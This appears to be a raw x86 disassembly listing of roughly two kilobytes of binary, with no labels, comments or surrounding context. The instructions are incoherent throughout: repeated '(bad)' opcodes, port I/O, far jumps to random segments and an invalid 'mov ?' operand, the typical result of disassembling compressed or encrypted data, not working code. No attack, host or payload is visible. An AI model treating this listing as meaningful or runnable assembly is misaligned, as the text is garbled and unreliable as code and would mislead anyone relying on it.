  41f1ff:	adc    eax,0xf23f88d3
  41f204:	add    al,0xa1
  41f206:	imul   edi,DWORD PTR [esi-0x78],0xffffff89
  41f20a:	out    0xc0,al
  41f20c:	mov    ch,0xc1
  41f20e:	fbstp  TBYTE PTR [ebx+0x750ff7e0]
  41f214:	and    ah,ch
  41f216:	push   ebx
  41f217:	cmc    
  41f218:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f219:	call   0xb096:0x9a2f225b
  41f220:	pop    esp
  41f221:	loope  0x41f1dd
  41f223:	test   BYTE PTR [ebp-0x6e],0xbe
  41f227:	xchg   esp,eax
  41f228:	pop    es
  41f229:	daa    
  41f22a:	inc    edi
  41f22b:	rcl    BYTE PTR [ebp+0x7aed5c5a],cl
  41f231:	pop    ss
  41f232:	xchg   edi,eax
  41f233:	(bad)  
  41f234:	pop    ds
  41f235:	leave  
  41f236:	in     eax,0x5c
  41f238:	aad    0x3e
  41f23a:	ja     0x41f23f
  41f23c:	pop    ebp
  41f23d:	mov    eax,ds:0xd6b706b
  41f242:	popa   
  41f243:	lds    eax,FWORD PTR [esi]
  41f245:	cmp    al,0xfb
  41f247:	ja     0x41f264
  41f249:	pop    ecx
  41f24a:	mov    bh,0x2b
  41f24c:	inc    edi
  41f24d:	in     al,dx
  41f24e:	pop    esi
  41f24f:	adc    DWORD PTR [eax],esi
  41f251:	mov    WORD PTR [ebx-0x30c31a71],fs
  41f257:	repz dec ebx
  41f259:	adc    eax,DWORD PTR [ebx+edi*8+0x616eb916]
  41f260:	adc    BYTE PTR [ecx],al
  41f262:	fwait
  41f263:	inc    ecx
  41f264:	or     DWORD PTR [ebx-0x96a7e2c],esp
  41f26a:	cmp    eax,esi
  41f26c:	js     0x41f2ce
  41f26e:	mov    dl,BYTE PTR [ebp+ebx*1-0x47]
  41f272:	xor    bh,BYTE PTR [eax]
  41f274:	dec    esi
  41f275:	push   esi
  41f276:	imul   ebx,DWORD PTR [edx+0x60eb9f19],0x62
  41f27d:	bnd jmp 0x41f2c3
  41f280:	mov    WORD PTR ds:0x3a7e369c,fs
  41f286:	mov    ch,0x34
  41f288:	xor    DWORD PTR [edx+0x66],ebx
  41f28b:	(bad)  
  41f28c:	cmp    eax,0x6eb17bd4
  41f291:	pop    ebx
  41f292:	jne    0x41f2b0
  41f294:	popf   
  41f295:	inc    ebx
  41f296:	push   ds
  41f297:	mov    dl,BYTE PTR [edi]
  41f299:	or     esi,eax
  41f29b:	mov    ecx,DWORD PTR [edi]
  41f29d:	int    0x1f
  41f29f:	cwde   
  41f2a0:	imul   esp,DWORD PTR [eax-0x3d62fff5],0xffffff83
  41f2a7:	imul   edx,DWORD PTR [edx],0xffffffee
  41f2aa:	and    eax,esp
  41f2ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2ad:	dec    edi
  41f2ae:	mov    edx,0x59cd9414
  41f2b3:	shr    DWORD PTR ds:0x1788df66,cl
  41f2b9:	xchg   ecx,eax
  41f2ba:	mov    dl,0x6a
  41f2bc:	xchg   bx,ax
  41f2be:	jmp    0xfc78:0xb3b92429
  41f2c5:	inc    esp
  41f2c6:	loope  0x41f308
  41f2c8:	fsub   QWORD PTR [ebx+ecx*4-0x25baf12c]
  41f2cf:	clc    
  41f2d0:	pavgw  mm6,QWORD PTR [ebx-0x5754e8a2]
  41f2d7:	and    eax,0xec86d8d1
  41f2dc:	xor    esp,DWORD PTR [edi+0xf2c297b]
  41f2e2:	das    
  41f2e3:	popf   
  41f2e4:	add    DWORD PTR [edx-0x21],esi
  41f2e7:	mov    ah,0x8f
  41f2e9:	into   
  41f2ea:	fwait
  41f2eb:	push   ss
  41f2ec:	or     al,0xe6
  41f2ee:	mov    ebp,0xcb9b2978
  41f2f3:	lods   eax,DWORD PTR ds:[esi]
  41f2f4:	jl     0x41f2ee
  41f2f6:	adc    dl,BYTE PTR [edi+0x33ff7487]
  41f2fc:	out    0x97,eax
  41f2fe:	mov    ch,0x94
  41f300:	ret    0xa532
  41f303:	js     0x41f2fa
  41f305:	pusha  
  41f306:	aad    0xed
  41f308:	or     dh,BYTE PTR [edi+0x3c96b1e7]
  41f30e:	jmp    0x51eb:0x244cf50e
  41f315:	(bad)  
  41f316:	push   esi
  41f317:	mov    dh,0xf5
  41f319:	in     eax,0x4e
  41f31b:	jmp    0xd91b:0xea1d11e3
  41f322:	dec    eax
  41f323:	fild   WORD PTR [ecx-0x46bb54a9]
  41f329:	cdq    
  41f32a:	fist   DWORD PTR [ebx+0x1b40a567]
  41f330:	push   ds
  41f331:	imul   DWORD PTR [edx+0x2c]
  41f334:	inc    esp
  41f335:	and    esi,DWORD PTR [edi+0x67374374]
  41f33b:	sub    dh,ch
  41f33d:	repnz (bad) 
  41f33f:	inc    ebp
  41f341:	push   ebp
  41f342:	enter  0xd700,0x22
  41f346:	jns    0x41f340
  41f348:	lds    edi,FWORD PTR [ebx*8-0x45de9a97]
  41f34f:	out    dx,eax
  41f350:	mov    ah,0x1d
  41f352:	fadd   QWORD PTR [ebx]
  41f354:	stos   BYTE PTR es:[edi],al
  41f355:	mov    eax,ds:0x3966d043
  41f35a:	repnz push esp
  41f35c:	nop
  41f35d:	sahf   
  41f35e:	mov    ch,0xd4
  41f360:	test   ah,dl
  41f362:	mov    ds:0x7ba2addd,al
  41f367:	ret    
  41f368:	repnz inc eax
  41f36a:	add    bl,ah
  41f36c:	dec    eax
  41f36d:	or     DWORD PTR [edi+edi*2-0x47],0x9cb4b6b3
  41f375:	add    al,0xf2
  41f377:	add    BYTE PTR [ebp+0x3a],0xe3
  41f37b:	out    0x72,eax
  41f37d:	jb     0x41f3e3
  41f37f:	mov    DWORD PTR [eax+0x5f],esi
  41f382:	cmc    
  41f383:	cmp    eax,0xeadda11a
  41f388:	and    DWORD PTR [edx+0x7d6c623b],0xef000db5
  41f392:	dec    ebx
  41f393:	fld    TBYTE PTR [ebx+0x2b14d5cc]
  41f399:	mov    ds:0xa459fb39,al
  41f39e:	jnp    0x41f3cb
  41f3a0:	push   cs
  41f3a1:	pop    esp
  41f3a2:	pop    edx
  41f3a3:	jmp    0x62c57657
  41f3a8:	push   ds
  41f3a9:	and    BYTE PTR [eax+0x6d860344],bh
  41f3af:	push   0xf63bf735
  41f3b4:	push   0xd5406c17
  41f3b9:	daa    
  41f3ba:	outs   dx,BYTE PTR ds:[esi]
  41f3bb:	xor    DWORD PTR [edi-0x24],esp
  41f3be:	xchg   edx,eax
  41f3bf:	test   DWORD PTR [ebx],ebp
  41f3c1:	or     DWORD PTR [edi+0x19],esi
  41f3c4:	pop    es
  41f3c5:	and    DWORD PTR [ebx],ecx
  41f3c7:	push   ecx
  41f3c8:	mov    WORD PTR [ebx+edi*1+0x5171aea4],fs
  41f3cf:	or     eax,DWORD PTR [esi+0x298ee2ac]
  41f3d5:	add    esi,DWORD PTR [eax+0x1f6d1004]
  41f3db:	xchg   edi,eax
  41f3dc:	xchg   ebp,eax
  41f3dd:	cdq    
  41f3de:	mov    ebx,0x67bf0847
  41f3e3:	enter  0xec43,0xc7
  41f3e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3e8:	xlat   BYTE PTR ds:[ebx]
  41f3e9:	sbb    BYTE PTR [ecx-0x6721e67b],ah
  41f3ef:	jmp    0x41f3d1
  41f3f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3f2:	cmp    edi,DWORD PTR [edi+0x244f72e1]
  41f3f8:	sbb    dl,BYTE PTR [eax-0x675bdfb8]
  41f3fe:	(bad)  
  41f3ff:	aam    0x8b
  41f401:	lea    esi,[ebx]
  41f403:	loopne 0x41f480
  41f405:	mov    ds:0xd5f196bb,eax
  41f40a:	nop
  41f40b:	out    dx,eax
  41f40c:	or     al,0xad
  41f40e:	loope  0x41f3b2
  41f410:	jp     0x41f419
  41f412:	mov    esp,0x44be4234
  41f417:	add    eax,0xba3ba79d
  41f41c:	jmp    0x41f49b
  41f41e:	shl    BYTE PTR [esi-0x9],cl
  41f421:	aaa    
  41f422:	mov    esi,0x9ba4eb33
  41f427:	fadd   DWORD PTR [ebx-0x36]
  41f42a:	scas   eax,DWORD PTR es:[edi]
  41f42b:	cdq    
  41f42c:	int3   
  41f42d:	jne    0x41f3bc
  41f42f:	xlat   BYTE PTR ds:[ebx]
  41f430:	pop    ecx
  41f431:	mov    al,ds:0x78c50edf
  41f436:	ud0    esp,DWORD PTR ds:0x3a582e79
  41f43d:	pop    ds
  41f43e:	outs   dx,DWORD PTR ds:[esi]
  41f43f:	sub    al,0xe9
  41f441:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f442:	sub    esp,eax
  41f444:	mov    ah,0xae
  41f446:	leave  
  41f447:	lahf   
  41f448:	sub    eax,0xbf0ef3be
  41f44d:	call   0xb0ed2931
  41f452:	mov    bl,0xd6
  41f454:	mov    al,BYTE PTR [ecx-0x3adb1051]
  41f45a:	imul   esi,edx,0x61ab9ced
  41f460:	xor    al,BYTE PTR [ebp+ecx*4+0x56]
  41f464:	sbb    BYTE PTR [edx],dl
  41f466:	xchg   esi,eax
  41f467:	mov    eax,ds:0x685ba312
  41f46c:	dec    DWORD PTR [ecx+0x66]
  41f46f:	rcl    DWORD PTR ds:0xcf9ecba1,1
  41f475:	mov    eax,ds:0x4a1bc3de
  41f47a:	xor    esp,DWORD PTR [edx+0x15ecfe76]
  41f480:	stos   DWORD PTR es:[edi],eax
  41f481:	aad    0xc2
  41f483:	je     0x41f41b
  41f485:	ss cdq 
  41f487:	xchg   DWORD PTR [esi],eax
  41f489:	jo     0x41f4c3
  41f48b:	and    esi,DWORD PTR [edi+0x5f]
  41f48e:	ins    DWORD PTR es:[edi],dx
  41f48f:	daa    
  41f490:	imul   edx,DWORD PTR [esi],0xffffffb9
  41f493:	mov    cl,0xaa
  41f495:	loop   0x41f44f
  41f497:	les    esp,FWORD PTR [esi-0x63]
  41f49a:	sub    eax,0xf67326bd
  41f49f:	mov    dl,0x3d
  41f4a1:	into   
  41f4a2:	fisttp QWORD PTR [eax+eiz*1+0x9]
  41f4a6:	cmc    
  41f4a7:	fwait
  41f4a8:	ins    DWORD PTR es:[edi],dx
  41f4a9:	mov    edx,0x9c5a39ad
  41f4ae:	sub    ebx,DWORD PTR [ecx]
  41f4b0:	xchg   esi,eax
  41f4b1:	dec    ebx
  41f4b2:	inc    edi
  41f4b3:	sbb    BYTE PTR [ebx],bl
  41f4b5:	and    BYTE PTR [edi-0x27],cl
  41f4b8:	sbb    cl,cl
  41f4ba:	(bad)  
  41f4bb:	sbb    ebx,DWORD PTR [ebp+ebx*4-0x5c]
  41f4bf:	retf   
  41f4c0:	aad    0x86
  41f4c2:	(bad)  
  41f4c3:	push   esi
  41f4c4:	adc    edx,esp
  41f4c6:	xchg   edx,eax
  41f4c7:	pop    edi
  41f4c8:	sbb    ecx,DWORD PTR [ecx]
  41f4ca:	lahf   
  41f4cb:	(bad)  
  41f4cc:	in     al,dx
  41f4cd:	fld    TBYTE PTR [ebx-0x6085e9da]
  41f4d3:	aad    0x94
  41f4d5:	into   
  41f4d6:	dec    eax
  41f4d7:	and    dh,BYTE PTR [eax]
  41f4d9:	lock stos DWORD PTR es:[edi],eax
  41f4db:	xrelease xchg BYTE PTR [esp+edx*4+0x15],al
  41f4e0:	jmp    0xbf06:0x2277e9ba
  41f4e7:	mov    edi,0x64b36afe
  41f4ec:	xchg   ebp,eax
  41f4ed:	add    BYTE PTR [eax+0x3984b686],ah
  41f4f3:	pop    edx
  41f4f4:	call   0x4da9f686
  41f4f9:	aaa    
  41f4fa:	mov    dl,0x70
  41f4fc:	push   ebp
  41f4fd:	test   eax,0x772831c2
  41f502:	push   ds
  41f503:	popf   
  41f504:	add    bl,BYTE PTR [edi-0x5f7ddc77]
  41f50a:	mov    edi,DWORD PTR ds:0xdcefc6f5
  41f510:	cmp    ecx,DWORD PTR [ecx]
  41f512:	loop   0x41f549
  41f514:	leave  
  41f515:	outs   dx,BYTE PTR ds:[esi]
  41f516:	mov    cl,0xd4
  41f518:	fidivr WORD PTR [esi+0x5a]
  41f51b:	pop    edx
  41f51c:	push   ebp
  41f51d:	or     eax,0xffcaed03
  41f522:	push   0xc3809f91
  41f527:	mov    ds:0xb63a9adb,al
  41f52c:	xchg   BYTE PTR [ebp+0x2974a5fb],ch
  41f532:	and    DWORD PTR [esi+0x32],edx
  41f535:	fwait
  41f536:	sbb    ah,BYTE PTR [esi+0x24]
  41f539:	test   eax,0x904243e3
  41f53e:	adc    al,BYTE PTR [ebx-0x5732192f]
  41f544:	fldcw  WORD PTR [ebx-0x33]
  41f547:	(bad)  [ecx+0x60ec3261]
  41f54d:	and    al,0x58
  41f54f:	push   ds
  41f550:	xchg   esp,eax
  41f551:	add    eax,0xf41545a1
  41f556:	into   
  41f557:	out    0x83,eax
  41f559:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f55a:	sub    ecx,ebp
  41f55c:	pusha  
  41f55d:	test   DWORD PTR [ebx-0x47b3e9bd],ebx
  41f563:	sub    bl,BYTE PTR [edi]
  41f565:	adc    BYTE PTR [ebx+0x5d2bd754],dh
  41f56b:	fld    QWORD PTR [esi+0x31632a69]
  41f571:	mov    ds:0x5d456665,eax
  41f576:	mov    ah,0x78
  41f578:	out    dx,eax
  41f579:	sbb    dh,BYTE PTR [esp+esi*2+0x4cff80a3]
  41f580:	test   DWORD PTR [ebx-0x5096167a],ebp
  41f586:	jns    0x41f5e1
  41f588:	sbb    al,0x49
  41f58a:	std    
  41f58b:	mov    BYTE PTR [esi-0x399f3c4d],dl
  41f591:	mov    al,ds:0x46ec1e3b
  41f596:	call   0xd804ff9e
  41f59b:	aam    0x88
  41f59d:	mov    cl,0xb2
  41f59f:	adc    al,0x99
  41f5a1:	dec    eax
  41f5a2:	(bad)  
  41f5a3:	loopne 0x41f54a
  41f5a5:	push   0xac89eccd
  41f5aa:	inc    esp
  41f5ab:	jb     0x41f598
  41f5ad:	cmp    cl,BYTE PTR [ebp-0x7f2e321]
  41f5b3:	or     eax,0x19ca93ba
  41f5b8:	cmc    
  41f5b9:	and    bl,BYTE PTR [ecx-0x75157711]
  41f5bf:	xchg   ecx,eax
  41f5c0:	mov    eax,0xde4b8bbc
  41f5c5:	inc    ebp
  41f5c6:	call   FWORD PTR [eax-0x2dae661a]
  41f5cc:	sub    BYTE PTR [esi-0x7d],0x8e
  41f5d0:	inc    ebp
  41f5d1:	xlat   BYTE PTR ds:[ebx]
  41f5d2:	shl    al,0x2e
  41f5d5:	shr    BYTE PTR [esi+0xe892212],cl
  41f5db:	jo     0x41f5ed
  41f5dd:	rcl    DWORD PTR [edx+0x6],cl
  41f5e0:	adc    dl,BYTE PTR [ebp-0x1f7eb471]
  41f5e6:	jmp    0x3be7ba48
  41f5eb:	adc    al,0x73
  41f5ed:	cwde   
  41f5ee:	mov    ah,0x30
  41f5f0:	in     eax,0xcc
  41f5f2:	scas   eax,DWORD PTR es:[edi]
  41f5f3:	sbb    DWORD PTR [eax+0x49],0x249654e1
  41f5fa:	xchg   BYTE PTR [edi-0x19a45af8],dh
  41f600:	rcl    ebx,1
  41f602:	sar    BYTE PTR [ecx+0x17f8ee3],0x22
  41f609:	pop    ecx
  41f60a:	xor    al,0xee
  41f60c:	jno    0x41f592
  41f60e:	xor    esi,DWORD PTR [ebx]
  41f610:	pushf  
  41f611:	test   al,0xdb
  41f613:	retf   0x5e0d
  41f616:	outs   dx,DWORD PTR ds:[esi]
  41f617:	call   0xe6a6:0xbe8d4176
  41f61e:	rcl    ah,cl
  41f620:	push   ss
  41f621:	test   al,0xef
  41f623:	mov    dl,0x5c
  41f625:	xchg   esp,eax
  41f626:	sub    eax,0x43a53fcb
  41f62b:	dec    ecx
  41f62c:	dec    esp
  41f62d:	js     0x41f683
  41f62f:	sub    BYTE PTR [eax+0x79],dl
  41f632:	arpl   WORD PTR [esi+eax*2+0x3206a43a],si
  41f639:	add    DWORD PTR [ebp+0x70],edx
  41f63c:	test   DWORD PTR [ebx],esi
  41f63e:	sbb    esi,ebx
  41f640:	test   eax,0x2535b821
  41f645:	sbb    DWORD PTR [eax],esi
  41f647:	ffree  st(3)
  41f649:	repnz sbb al,dh
  41f64c:	mov    bh,0xb1
  41f64e:	stos   DWORD PTR es:[edi],eax
  41f64f:	sti    
  41f650:	jbe    0x41f6bf
  41f652:	dec    edi
  41f653:	addr16 sti 
  41f655:	sbb    cl,BYTE PTR [ebx]
  41f657:	(bad)  
  41f658:	lea    ecx,[ecx]
  41f65a:	sbb    esi,DWORD PTR [edi+0xa16abf0]
  41f660:	popa   
  41f661:	(bad)  
  41f662:	ret    
  41f663:	xchg   esp,eax
  41f664:	pusha  
  41f665:	sahf   
  41f666:	mov    ebx,0x32ccbd1a
  41f66b:	retf   0x56bf
  41f66e:	jp     0x41f6b6
  41f670:	cmp    DWORD PTR [esp+edi*4+0x64],esp
  41f674:	add    al,BYTE PTR [esp+edi*2-0x50]
  41f678:	xchg   ebp,eax
  41f679:	sbb    BYTE PTR [esp+ebp*1],ch
  41f67c:	loopne 0x41f689
  41f67e:	xchg   DWORD PTR [esi+0x67],esi
  41f681:	mov    WORD PTR [eax],gs
  41f683:	out    0x1e,al
  41f685:	or     DWORD PTR [edx+0x37],esp
  41f688:	fist   WORD PTR [ebx]
  41f68a:	and    DWORD PTR [ebp+0x5b],esp
  41f68d:	lahf   
  41f68e:	pop    ebx
  41f68f:	dec    ecx
  41f690:	arpl   cx,bx
  41f692:	mov    esp,0x3f3ca9a7
  41f697:	cmp    al,BYTE PTR [esi+0x67]
  41f69a:	ja     0x41f642
  41f69c:	js     0x41f662
  41f69e:	mov    ebp,0xbd2b6c8
  41f6a3:	mov    ds:0x549845f,al
  41f6a8:	cwde   
  41f6a9:	(bad)  
  41f6aa:	(bad)  
  41f6ab:	bound  ecx,QWORD PTR [edi-0x37]
  41f6ae:	push   ds
  41f6af:	fwait
  41f6b0:	jecxz  0x41f690
  41f6b2:	cmp    dh,BYTE PTR [eax+eiz*2-0x2b]
  41f6b6:	or     al,0x6f
  41f6b8:	adc    al,0x5f
  41f6ba:	mov    esi,0x2ba68aea
  41f6bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6c0:	shl    DWORD PTR [edi],1
  41f6c2:	jmp    0x41f6ef
  41f6c4:	es jns 0x41f6f2
  41f6c7:	dec    ebx
  41f6c8:	push   ebx
  41f6c9:	jge    0x41f6cb
  41f6cb:	inc    ebp
  41f6cc:	fs pop eax
  41f6ce:	adc    ecx,DWORD PTR [edi+0x55]
  41f6d1:	sub    al,0x32
  41f6d3:	bnd repz jo 0x41f6e2
  41f6d7:	pop    ebp
  41f6d8:	pop    ss
  41f6d9:	cdq    
  41f6da:	push   ss
  41f6db:	inc    ebp
  41f6dc:	(bad)  
  41f6dd:	adc    ah,BYTE PTR [esi]
  41f6df:	in     eax,0xc7
  41f6e1:	fsubp  st(4),st
  41f6e3:	sub    edx,DWORD PTR [eax+ebp*1+0x5b]
  41f6e7:	test   esp,edx
  41f6e9:	mov    al,0xe9
  41f6eb:	xchg   esp,eax
  41f6ec:	scas   eax,DWORD PTR es:[edi]
  41f6ed:	rol    DWORD PTR [ecx],cl
  41f6ef:	jnp    0x41f755
  41f6f1:	inc    esi
  41f6f2:	mov    ds:0x22f44fe5,eax
  41f6f7:	xchg   ebp,eax
  41f6f8:	and    DWORD PTR [esi],esp
  41f6fa:	fdivr  QWORD PTR [esi]
  41f6fc:	and    DWORD PTR [edx-0x5f78fa45],0xffffffc3
  41f703:	aam    0xe3
  41f705:	push   ds
  41f706:	icebp  
  41f707:	aam    0x41
  41f709:	cmp    al,0xba
  41f70b:	fs or  ebx,edi
  41f70e:	adc    al,0x3
  41f710:	test   DWORD PTR [esp+eiz*2-0x42bb0b1b],edi
  41f717:	imul   esp,DWORD PTR ds:0xdfd248c9,0xc05a14f7
  41f721:	mov    ds:0x283dc57b,eax
  41f726:	jmp    0xcef7:0x38c56ac
  41f72d:	mov    ebx,0x3aa4e4be
  41f732:	pop    ecx
  41f733:	and    eax,0x29dc0e65
  41f738:	scas   eax,DWORD PTR es:[edi]
  41f739:	dec    ebx
  41f73a:	jecxz  0x41f6c7
  41f73c:	push   es
  41f73d:	jnp    0x41f79f
  41f73f:	out    dx,al
  41f740:	sti    
  41f741:	xchg   esi,edx
  41f743:	push   0x17
  41f745:	dec    ebx
  41f746:	mov    eax,0x9259e6b4
  41f74b:	add    DWORD PTR [eax+0x66],ebx
  41f74e:	mov    ecx,ecx
  41f750:	and    eax,0x67f0762c
  41f755:	mov    BYTE PTR [esi-0x5d],ch
  41f758:	push   cs
  41f759:	jmp    0x89e3:0x9a15bbcd
  41f760:	leave  
  41f761:	jl     0x41f7c6
  41f763:	cmp    al,0x75
  41f765:	lods   eax,DWORD PTR ds:[esi]
  41f766:	shl    ebx,cl
  41f768:	adc    ch,dl
  41f76a:	cmp    ebx,edx
  41f76c:	sbb    al,0x39
  41f76e:	or     BYTE PTR [edx],ch
  41f770:	sub    DWORD PTR [ecx],0xb61c4146
  41f776:	jnp    0x41f763
  41f778:	add    al,0x34
  41f77a:	icebp  
  41f77b:	and    BYTE PTR ds:0x368e681d,dl
  41f781:	pop    ecx
  41f782:	inc    edi
  41f783:	sub    eax,0x3b5024e8
  41f788:	jmp    0x41f792
  41f78a:	mov    bh,0xe9
  41f78c:	pop    ebp
  41f78d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f78e:	mov    ecx,DWORD PTR [edx-0x899c2f5]
  41f794:	ret    
  41f795:	mov    DWORD PTR ds:0x5d379e4a,eax
  41f79b:	xchg   esp,eax
  41f79c:	mov    dl,BYTE PTR [edi]
  41f79e:	mov    ebp,0x2f7c1164
  41f7a3:	or     eax,0xb20f410d
  41f7a8:	and    cl,BYTE PTR [ecx+0x5]
  41f7ab:	push   ebx
  41f7ac:	adc    ch,BYTE PTR [eax+0x492059c9]
  41f7b2:	dec    eax
  41f7b3:	pop    ebp
  41f7b4:	xchg   ebx,eax
  41f7b5:	pop    ebp
  41f7b6:	and    BYTE PTR [edx-0x703458d2],ch
  41f7bc:	mov    ss,WORD PTR [esi+ecx*8+0x6c]
  41f7c0:	xchg   ecx,eax
  41f7c1:	(bad)  
  41f7c2:	or     BYTE PTR [edi+0x10],cl
  41f7c5:	and    bh,BYTE PTR [eax-0x149b331c]
  41f7cb:	pop    ss
  41f7cc:	xchg   esi,eax
  41f7cd:	lock out dx,eax
  41f7cf:	shr    DWORD PTR [ecx+0x71fef6d7],1
  41f7d5:	sahf   
  41f7d6:	mov    ecx,0xddb918ac
  41f7db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7dc:	inc    ebp
  41f7dd:	rcl    DWORD PTR [ecx+0x4bd17cdb],cl
  41f7e3:	or     BYTE PTR [edi+0x254284c7],al
  41f7e9:	and    eax,0xb91d1990
  41f7ee:	mov    ecx,0xecfb4fbc
  41f7f3:	cmp    esi,DWORD PTR [edi-0x2bcc6463]
  41f7f9:	neg    DWORD PTR [esp+eiz*2]
  41f7fc:	mov    DWORD PTR [esi-0x46e049a6],ecx
  41f802:	hlt    
  41f803:	sub    edi,DWORD PTR [ebp-0x6f]
  41f806:	xor    al,BYTE PTR [ebx+0x27]
  41f809:	add    bh,BYTE PTR [esi-0x45]
  41f80c:	jo     0x41f7b0
  41f80e:	sti    
  41f80f:	inc    eax
  41f810:	arpl   si,bx
  41f812:	sti    
  41f813:	and    ebx,DWORD PTR [ebx]
  41f815:	jns    0x41f7ee
  41f817:	mov    al,0x5a
  41f819:	rol    BYTE PTR [ebx+0x3d7c9ab5],cl
  41f81f:	mov    dl,0xaf
  41f821:	mov    al,ds:0x6094d3b
  41f826:	jno    0x41f7d3
  41f828:	fdiv   st(4),st
  41f82a:	fcom   QWORD PTR [ebx-0x18393293]
  41f830:	mov    bh,0xe
  41f832:	mov    esi,0xc4c38537
  41f837:	lock inc eax
  41f839:	xchg   ebx,eax
  41f83a:	mov    edx,0xcb491dfd
  41f83f:	dec    ebp
  41f840:	nop
  41f841:	jmp    0x7c0b:0x9b5a3eae
  41f848:	pop    esp
  41f849:	push   0x996bb676
  41f84e:	clc    
  41f84f:	dec    edx
  41f850:	and    esp,edx
  41f852:	mov    esi,0xba502434
  41f857:	sub    DWORD PTR [ebp+0x7eea36ab],esp
  41f85d:	pop    ebp
  41f85e:	ret    0x1ec7
  41f861:	mov    DWORD PTR ds:0xe144f2e8,ebx
  41f867:	(bad)  [esi]
  41f869:	xchg   ecx,eax
  41f86a:	sub    al,0x5c
  41f86c:	add    BYTE PTR [esi-0x488d560],cl
  41f872:	mov    bl,0x90
  41f874:	push   ss
  41f875:	push   cs
  41f876:	popa   
  41f877:	sub    dl,BYTE PTR [edx-0x57]
  41f87a:	mov    gs,WORD PTR [esi+0x3d]
  41f87d:	in     al,0x11
  41f87f:	xor    eax,0x90e3d5c0
  41f884:	mov    ds:0x4bc0e99f,eax
  41f889:	mov    eax,ds:0x2e1cc14b
  41f88e:	or     al,0xd3
  41f890:	retf   0x5363
  41f893:	dec    ebx
  41f894:	repnz icebp 
  41f896:	xchg   dh,dh
  41f898:	js     0x41f8ef
  41f89a:	mov    esi,0xfba3f46c
  41f89f:	ret    
  41f8a0:	fidiv  WORD PTR [ebp+esi*2+0x7a458d87]
  41f8a7:	in     al,0x7c
  41f8a9:	push   es
  41f8aa:	mov    bh,0xc4
  41f8ac:	push   ds
  41f8ad:	add    DWORD PTR [edx-0x39f17a4a],ebx
  41f8b3:	jmp    0x691e:0xc84e9c64
  41f8ba:	dec    eax
  41f8bb:	pushf  
  41f8bc:	cmc    
  41f8bd:	inc    ebx
  41f8be:	das    
  41f8bf:	add    al,0x15
  41f8c1:	fwait
  41f8c2:	mov    esp,DWORD PTR [ebp+ebx*8+0x3520b45b]
  41f8c9:	push   ebp
  41f8ca:	and    eax,0xb794b520
  41f8cf:	add    al,0x50
  41f8d1:	scas   eax,DWORD PTR es:[edi]
  41f8d2:	out    dx,eax
  41f8d3:	push   edx
  41f8d4:	pop    ds
  41f8d5:	mov    eax,ds:0xcbd967db
  41f8da:	and    eax,0xbc8382f
  41f8df:	push   esi
  41f8e0:	shl    DWORD PTR [ebp-0x45],1
  41f8e3:	add    al,0x4d
  41f8e5:	cmp    BYTE PTR [ecx-0x62],0x75
  41f8e9:	jmp    0x37c0:0x89a1ef93
  41f8f0:	mov    ebx,DWORD PTR [ecx+0x11]
  41f8f3:	ins    BYTE PTR es:[edi],dx
  41f8f4:	inc    edi
  41f8f5:	cmp    BYTE PTR [esi-0x59],dh
  41f8f8:	pop    ss
  41f8f9:	pop    edx
  41f8fa:	sub    ebx,DWORD PTR [edx-0x72d461a3]
  41f900:	aam    0x52
  41f902:	adc    dh,dl
  41f904:	mov    ds:0x81b06ba,al
  41f909:	in     al,0xbf
  41f90b:	xor    al,0xa8
  41f90d:	ins    DWORD PTR es:[edi],dx
  41f90e:	mov    ss,WORD PTR [ebx]
  41f910:	push   ebp
  41f911:	xchg   ebx,eax
  41f912:	dec    esi
  41f913:	repz das 
  41f915:	lock in eax,0xf8
  41f918:	or     WORD PTR [ecx+edi*1+0x7da0ac43],sp
  41f920:	and    eax,0xf88102c1
  41f925:	call   0x4872:0x3cb142fb
  41f92c:	inc    ebx
  41f92d:	jle    0x41f915
  41f92f:	pop    ss
  41f930:	call   0xb8e8:0x16f777d9
  41f937:	les    esp,FWORD PTR [ecx+0x777ffb9b]
  41f93d:	cs adc eax,0x744312b8
  41f943:	in     eax,0xb1
  41f945:	out    dx,eax
  41f946:	mov    esi,0x6c13e454
  41f94b:	push   edx
  41f94c:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41f94e:	xor    eax,0xc509dbe9
  41f953:	inc    ebp
  41f954:	std    
  41f955:	sub    DWORD PTR [ecx],esi
  41f957:	or     ah,al
  41f959:	nop
  41f95a:	inc    ebx
  41f95b:	and    esi,DWORD PTR [ecx+0x3ecce0a2]
  41f961:	xchg   ebp,eax
  41f962:	pusha  
  41f963:	jmp    0x82da26d
  41f968:	and    al,0x7f
  41f96a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f96b:	or     eax,0xa1dc8039
  41f970:	sahf   
  41f971:	mov    ?,WORD PTR [ebp-0x1a]
  41f974:	fwait
  41f975:	mov    bl,0xb0
  41f977:	shl    BYTE PTR [ebx],0x9b
  41f97a:	sti    
  41f97b:	adc    eax,0x94654dd6
  41f980:	dec    edi
  41f981:	mov    edx,0x5363ef1a
  41f986:	add    DWORD PTR ds:0x6c8f7518,eax
  41f98c:	lods   eax,DWORD PTR ds:[esi]
  41f98d:	mov    ds:0xb8e996bb,al
  41f992:	mov    edx,0xc4b2b2f
  41f997:	pop    ebx
  41f998:	aad    0xcd
  41f99a:	jnp    0x41fa11
  41f99c:	pop    es
  41f99d:	mov    eax,ds:0x330186ab
  41f9a2:	je     0x41f9a7
  41f9a4:	fwait
  41f9a5:	jmp    0x41f9d7
  41f9a7:	(bad)  
  41f9a8:	cdq    
  41f9a9:	lds    esi,FWORD PTR [ecx+0x6baed524]
  41f9af:	das    
  41f9b0:	cmp    dl,cl
  41f9b2:	or     ecx,DWORD PTR [ebp-0x1b]
  41f9b5:	xchg   BYTE PTR [esi],ch
  41f9b7:	out    dx,al
  41f9b8:	add    al,0x65
  41f9ba:	jg     0x41f9e3
  41f9bc:	into   
  41f9bd:	cdq    
  41f9be:	jnp    0x41f95a
  41f9c0:	cmp    ebx,DWORD PTR [ecx+edx*4]
  41f9c3:	jp     0x41f9b3
  41f9c5:	mov    esi,0x30c365eb
